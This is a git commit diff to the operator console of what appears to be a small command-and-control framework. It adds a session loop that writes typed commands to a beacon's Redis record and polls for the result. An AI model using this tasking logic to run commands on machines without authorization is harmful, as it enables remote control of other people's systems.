a15a7b88f65fcedc826510cab75c54163c2faba0
matt-culbert <culbertmatt@gmail.com>
2023-05-07 20:33:53 -0400

    Add files via upload
    QoL updates to how information is displayed.... still trying to fix beacons re checking in

--- controller.py
+++ controller.py
@@ -7,12 +7,21 @@ import json
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 
+
 def clearDB():
     for key in conn.scan_iter("*"):
         conn.delete(key)
 
+
 def searchUUID(uuid):
-    print(conn.hget('UUID', uuid))
+    dt = conn.hget('UUID', uuid)
+    dt = dt.decode()  # Decode it from bytes
+    lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
+    structure = json.dumps(lastcheckin)  # Dump the dict to json
+    connector = json.loads(structure)  # Load it into a new var
+    name = connector["WhoAmI"]
+    print(name)
+
 
 while True:
     # We should change this to a help dialogue
@@ -24,51 +33,48 @@ while True:
     # Set command and then await for a new var to be set
     # We will set the retrieved value when it fetches a new command
     # If retrieved is 0, then don't display. If it's 1, display the result and then reset to 0
-    inp = input('(1)Enter command \n '
-                '(2)Search by UUID \n '
-                '(3)Clear DB \n '
-                '(4)Start a listener \n '
-                '(5)List all \n'
-                '> ')
+    inp = input('> ')
     if inp == '1':
         uuid = input('UUID: ')
-        comm = input('Command: ')
-        # I want to preserve the current last check in time
-        # so dump the DB and grab that field
-        dt = conn.hget('UUID', uuid)  # Get the struct
-        dt = dt.decode()  # Decode it from bytes
-        lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
-        structure = json.dumps(lastcheckin)  # Dump the dict to json
-        connector = json.loads(structure)  # Load it into a new var
-        LastInteraction = connector["LastInteraction"]
-        whoami = connector["WhoAmI"]
-        result = connector["Result"]
-        structure = {
-            "WhoAmI": f"{whoami}",
-            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
-            "Command": f"{comm}",
-            "LastInteraction": f"{LastInteraction}",
-            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-            "Result": f"{result}",
-            "GotIt": "0"
-        }
-        structure = json.dumps(structure)  # Dump the json
-        # Write the message value to the beacon:UUID key
-        conn.hset('UUID', uuid, structure)
-
-        # Await the beacon retrieving the command
-        # Check the db for an update value
-        canWeDisplay = connector["GotIt"]
-        while canWeDisplay == "0":
-            # We have to refresh the DB connectors to get updated results it seems
+        while inp != "exit":  # If the input is exit, break the loop
+            inp = input('> ')
+            # I want to preserve the current last check in time
+            # so dump the DB and grab that field
             dt = conn.hget('UUID', uuid)  # Get the struct
             dt = dt.decode()  # Decode it from bytes
             lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
             structure = json.dumps(lastcheckin)  # Dump the dict to json
             connector = json.loads(structure)  # Load it into a new var
+            LastInteraction = connector["LastInteraction"]
+            whoami = connector["WhoAmI"]
+            result = connector["Result"]
+            structure = {
+                "WhoAmI": f"{whoami}",
+                "Retrieved": "1",  # Set retrieved to 1 so we know we got results
+                "Command": f"{inp}",
+                "LastInteraction": f"{LastInteraction}",
+                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
+                "Result": f"{result}",
+                "GotIt": "0"
+            }
+            structure = json.dumps(structure)  # Dump the json
+            # Write the message value to the beacon:UUID key
+            conn.hset('UUID', uuid, structure)
+            print("Set command... \n")
+            # Await the beacon retrieving the command
+            # Check the db for an update value
             canWeDisplay = connector["GotIt"]
-        result = connector["Result"]
-        print(result)
+            print("Waiting for returned data... \n")
+            while canWeDisplay == "0":
+                # We have to refresh the DB connectors to get updated results it seems
+                dt = conn.hget('UUID', uuid)  # Get the struct
+                dt = dt.decode()  # Decode it from bytes
+                lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
+                structure = json.dumps(lastcheckin)  # Dump the dict to json
+                connector = json.loads(structure)  # Load it into a new var
+                canWeDisplay = connector["GotIt"]
+            result = connector["Result"]
+            print(result)
 
     elif inp == '2':
         uuid = input('UUID: ')
@@ -78,5 +84,11 @@ while True:
     elif inp == "4":
         subprocess.Popen(["python3", "listener.py"])
     elif inp == "5":
-        #print(conn.keys()) # UUID is the key but we want values from the key
-        print(conn.hgetall('UUID')) # We're searching by hash values here
+        # print(conn.keys()) # UUID is the key but we want values from the key
+        print(conn.hgetall('UUID'))  # We're searching by hash values here
+    else:
+        print('(1)Enter session \n '
+              '(2)Search by UUID \n '
+              '(3)Clear DB \n '
+              '(4)Start a listener \n '
+              '(5)List all \n')
